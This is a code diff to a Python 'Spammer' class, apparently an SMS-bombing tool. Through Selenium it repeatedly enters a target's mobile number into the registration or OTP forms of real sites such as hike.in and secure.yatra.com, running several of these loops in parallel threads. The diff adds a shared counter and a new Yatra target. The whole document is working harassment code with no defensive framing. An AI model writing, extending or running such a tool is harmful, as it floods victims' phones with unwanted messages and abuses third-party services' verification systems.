@@ -15,6 +15,7 @@ class Spammer:
     def __init__(self, mobile, count, seconds, headless=False):
         self.mobile_no = mobile
         self.bomb_count = round(int(count))
+        self.spam_count = 0
         self.delay = float(seconds)
         if headless:
             Spammer.chrome_options.add_argument("--headless")
@@ -36,8 +37,9 @@ class Spammer:
             driver.execute_script("arguments[0].click();", element)
 
             driver.refresh()
-            i += 1
+            self.spam_count += 1
             self.bomb_count -= 1
+            i += 1
 
             time.sleep(self.delay)
 
@@ -49,7 +51,7 @@ class Spammer:
         driver.get("https://hike.in/")
 
         i = 0
-        while i <= self.bomb_count:
+        while self.spam_count <= self.bomb_count:
             mobile_input = driver.find_element_by_id("number-input")
             mobile_input.clear()
             mobile_input.send_keys(self.mobile_no)
@@ -58,9 +60,9 @@ class Spammer:
             driver.execute_script("arguments[0].click();", button)
 
             driver.refresh()
-            i += 1
+            self.spam_count += 1
             self.bomb_count -= 1
-
+            i += 1
             time.sleep(self.delay)
 
         print(i)
@@ -75,7 +77,7 @@ class Spammer:
         email = random_string + "@ggwp.xxx"
 
         i = 0
-        while i <= self.bomb_count:
+        while self.spam_count <= self.bomb_count:
             mobile_input = driver.find_element_by_id("mobileno")
             mobile_input.clear()
             mobile_input.send_keys(self.mobile_no)
@@ -92,8 +94,32 @@ class Spammer:
             driver.execute_script("arguments[0].click();", button)
 
             driver.refresh()
-            i += 1
+            self.spam_count += 1
             self.bomb_count -= 1
+            i += 1
+
+            time.sleep(self.delay)
+
+        print(i)
+        driver.close()
+
+    def yatra_blast(self):
+        driver = webdriver.Chrome(executable_path=Spammer.path, chrome_options=Spammer.chrome_options)
+        driver.get("https://secure.yatra.com/social/common/yatra/register")
+
+        i = 0
+        while self.spam_count <= self.bomb_count:
+            mobile_input = driver.find_element_by_id("login-input")
+            mobile_input.clear()
+            mobile_input.send_keys(self.mobile_no)
+
+            button = driver.find_element_by_id("login-continue-btn")
+            driver.execute_script("arguments[0].click();", button)
+
+            driver.refresh()
+            self.spam_count += 1
+            self.bomb_count -= 1
+            i += 1
 
             time.sleep(self.delay)
 
@@ -104,6 +130,8 @@ class Spammer:
         t1 = Thread(target=self.hike_blast, args=[])
         t2 = Thread(target=self.redbus_blast, args=[])
         t3 = Thread(target=self.biryani_blast, args=[])
+        t4 = Thread(target=self.yatra_blast, args=[])
         t1.start()
         t2.start()
         t3.start()
+        t4.start()
